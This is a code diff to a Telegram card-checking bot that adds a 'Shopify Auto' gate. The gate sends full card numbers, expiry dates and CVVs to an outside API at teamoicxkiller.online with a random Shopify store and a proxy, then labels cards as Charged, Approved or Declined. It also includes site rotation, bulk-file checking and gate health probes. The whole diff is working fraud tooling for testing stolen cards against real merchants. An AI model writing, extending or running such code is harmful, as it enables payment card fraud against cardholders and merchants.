@@ -36,6 +36,7 @@ ADMINS_FILE = os.path.join(DATA_DIR, "tg_admins.json")
 GATE_STATS_FILE = os.path.join(DATA_DIR, "tg_gate_stats.json")
 GATE_STATUS_FILE = os.path.join(DATA_DIR, "tg_gate_status.json")
 PROXIES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt")
+SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt")
 USER_PROXIES_DIR = os.path.join(DATA_DIR, "user_proxies")
 
 os.makedirs(DATA_DIR, exist_ok=True)
@@ -148,6 +149,7 @@ GATE_PROBE_MAP = {
     "auth": {"name": "Stripe Auth (Dilaboards)", "cmd": "/chkapiauth"},
     "st1": {"name": "HiAPI Check3", "cmd": "/chkapist1"},
     "st5": {"name": "HiAPI Check", "cmd": "/chkapist5"},
+    "autosho": {"name": "Shopify Auto", "cmd": "/chkapiautosho"},
 }
 
 
@@ -164,6 +166,12 @@ def probe_gate(gate_key):
             resp = requests.get('https://ck.hiapi.club/', headers={'User-Agent': _rand_ua()}, timeout=10)
             alive = resp.status_code in (200, 403)
             detail = f"HTTP {resp.status_code}"
+        elif gate_key == "autosho":
+            resp = requests.get('https://teamoicxkiller.online/code/index.php', headers={'User-Agent': _rand_ua()}, timeout=10)
+            alive = resp.status_code in (200, 400, 403)
+            sites = load_shopify_sites() if 'load_shopify_sites' in dir() else []
+            site_count = len(sites) if sites else 0
+            detail = f"HTTP {resp.status_code} | {site_count} sites loaded"
         else:
             return False, 0, "Unknown gate"
 
@@ -1113,6 +1121,130 @@ def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
 
     return f"⚠️ Auth2 API Down | All endpoints unreachable ({round(time.time() - start_time, 2)}s)"
 
+# ============================================================
+#  Shopify gate — uses teamoicxkiller.online API + sites.txt
+# ============================================================
+SHOPIFY_DEAD_INDICATORS = [
+    'receipt id is empty', 'handle is empty', 'product id is empty',
+    'tax amount is empty', 'payment method identifier is empty',
+    'invalid url', 'error in 1st req', 'error in 1 req',
+    'cloudflare', 'connection failed', 'timed out',
+    'access denied', 'tlsv1 alert', 'ssl routines',
+    'could not resolve', 'domain name not found',
+    'name or service not known', 'openssl ssl_connect',
+    'empty reply from server', 'httperror504', 'http error',
+    'timeout', 'unreachable', 'ssl error',
+    '502', '503', '504', 'bad gateway', 'service unavailable',
+    'gateway timeout', 'network error', 'connection reset',
+    'failed to detect product', 'failed to create checkout',
+    'failed to tokenize card', 'failed to get proposal data',
+    'submit rejected', 'handle error', 'http 404',
+    'url rejected', 'malformed input', 'amount_too_small',
+    'captcha_required', 'captcha required', 'site dead', 'failed'
+]
+
+SHOPIFY_APPROVED_KW = [
+    'invalid_cvv', 'incorrect_cvv', 'insufficient_funds', 'approved',
+    'success', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip',
+    'insufficient funds'
+]
+
+
+def load_shopify_sites():
+    """Load sites from sites.txt in same folder as bot."""
+    if not os.path.exists(SITES_FILE):
+        return []
+    with open(SITES_FILE, 'r') as f:
+        return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+
+
+def check_cc_shopify(cc_number, month, year, cvv, proxies=None):
+    """Shopify gate — checks card via Shopify API using random site from sites.txt."""
+    start_time = time.time()
+    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
+
+    sites = load_shopify_sites()
+    if not sites:
+        return "⚠️ No sites in sites.txt | Admin needs to add Shopify sites"
+
+    # Try up to 3 sites
+    last_error = "All sites failed"
+    for attempt in range(min(3, len(sites))):
+        site = random.choice(sites)
+        if not site.startswith('http'):
+            site = f'https://{site}'
+
+        try:
+            # Build proxy string for the API
+            proxy_str = ""
+            if proxies:
+                for scheme in ("https", "http", "socks5", "socks4"):
+                    if scheme in proxies:
+                        raw = proxies[scheme].replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
+                        proxy_str = raw
+                        break
+
+            url = f'https://teamoicxkiller.online/code/index.php?cc={cc_data}&url={site}'
+            if proxy_str:
+                url += f'&proxy={proxy_str}'
+
+            resp = requests.get(url, headers={'User-Agent': _rand_ua()}, timeout=100)
+            process_time = round(time.time() - start_time, 2)
+
+            if resp.status_code != 200:
+                last_error = f"API HTTP {resp.status_code}"
+                continue
+
+            try:
+                rj = resp.json()
+            except Exception:
+                last_error = f"Invalid JSON: {resp.text[:60]}"
+                continue
+
+            api_response = rj.get('Response', '')
+            price = rj.get('Price', '-')
+            if price != '-':
+                price = f"${price}"
+            gateway = rj.get('Gate', 'Shopify')
+            resp_lower = api_response.lower()
+
+            # Check for dead site
+            if any(ind in resp_lower for ind in SHOPIFY_DEAD_INDICATORS):
+                last_error = f"Site dead: {api_response[:60]}"
+                continue  # Try next site
+
+            # Check for 3DS
+            if '3d' in resp_lower:
+                return f"Declined | 3DS Required | {gateway} | {price} ({process_time}s)"
+
+            # Check for charged
+            if 'order completed' in resp_lower or '💎' in api_response or 'thank you' in resp_lower or 'payment successful' in resp_lower:
+                return f"Charged 💎 | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
+
+            # Check for approved
+            if any(kw in resp_lower for kw in SHOPIFY_APPROVED_KW):
+                return f"Approved | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
+
+            # Cloudflare
+            if 'cloudflare' in resp_lower:
+                last_error = "Cloudflare blocked"
+                continue
+
+            # Default — declined
+            return f"Declined | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
+
+        except requests.exceptions.Timeout:
+            last_error = "API timeout"
+            continue
+        except requests.exceptions.ConnectionError:
+            last_error = "API unreachable"
+            continue
+        except Exception as e:
+            return f"Error: {str(e)}"
+
+    process_time = round(time.time() - start_time, 2)
+    return f"⚠️ Shopify Failed | {last_error} ({process_time}s)"
+
 
 def process_single_entry(entry, proxies_list, user_id, gate="auth"):
     raw_proxy = random.choice(proxies_list) if proxies_list else None
@@ -1134,6 +1266,8 @@ def process_single_entry(entry, proxies_list, user_id, gate="auth"):
                 result = check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check3", proxy_dict)
             elif gate == "st5":
                 result = check_cc_hiapi(c_num, c_mm, c_yy, c_cvv, "check", proxy_dict)
+            elif gate == "autosho":
+                result = check_cc_shopify(c_num, c_mm, c_yy, c_cvv, proxy_dict)
             else:
                 result = run_automated_process(c_num, c_cvv, c_yy, c_mm, proxy_dict)
         else:
@@ -1247,6 +1381,7 @@ def fmt_start(is_adm=False):
         "Upload a <b>.txt</b> file, then reply to it with a gate command\n\n"
         "<b>Gates:</b>\n"
         "  /auth       — Stripe Auth (Dilaboards)\n"
+        "  /autosho    — Shopify Auto (sites.txt)\n"
         "  /st1        — HiAPI Check3\n"
         "  /st5        — HiAPI Check\n\n"
         "<b>Commands:</b>\n"
@@ -1270,16 +1405,14 @@ def fmt_start(is_adm=False):
             "  /authlist   — List authorized users\n"
             "  /revoke     — Revoke user access\n"
             "  /broadcast  — Message all users\n"
-            "  /chkapis    — Health check all APIs\n"
-            "  /chkapiauth — Check auth gate\n"
-            "  /chkapist1  — Check st1 gate\n"
-            "  /chkapist5  — Check st5 gate\n\n"
+            "  /chkapis    — Health check all APIs\n\n"
         )
 
     base += (
         "<b>How to use:</b>\n"
         "  <b>Single:</b> <code>/auth 4111...|01|25|123</code>\n"
         "  <b>Bulk:</b> Send .txt → reply with /auth\n"
+        "  <b>Shopify:</b> <code>/autosho 4111...|01|25|123</code>\n"
         f"{FOOTER}"
     )
     return base
@@ -1581,6 +1714,7 @@ def handle_update(update):
     # --- /chkapi* — Admin-only secret API health checks ---
     chkapi_cmds = {
         "/chkapiauth": "auth",
+        "/chkapiautosho": "autosho",
         "/chkapist1": "st1",
         "/chkapist5": "st5",
     }
@@ -1662,6 +1796,7 @@ def handle_update(update):
     if text == "/gates":
         GATE_REGISTRY = [
             ("auth", "/auth", "Stripe Auth (Dilaboards)", True),
+            ("autosho", "/autosho", "Shopify Auto", True),
             ("st1", "/st1", "HiAPI Check3", True),
             ("st5", "/st5", "HiAPI Check", True),
         ]
@@ -2024,7 +2159,7 @@ def handle_update(update):
         return
 
     # --- Gate commands: /auth, /st1, /st5 (single card OR bulk file) ---
-    gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
+    gate_map = {"/auth": ("auth", "Stripe Auth (Dilaboards)"), "/autosho": ("autosho", "Shopify Auto"), "/st1": ("st1", "HiAPI Check3"), "/st5": ("st5", "HiAPI Check")}
     cmd_base = text.split()[0] if text else ""
     if cmd_base in gate_map:
         gate, gate_label = gate_map[cmd_base]
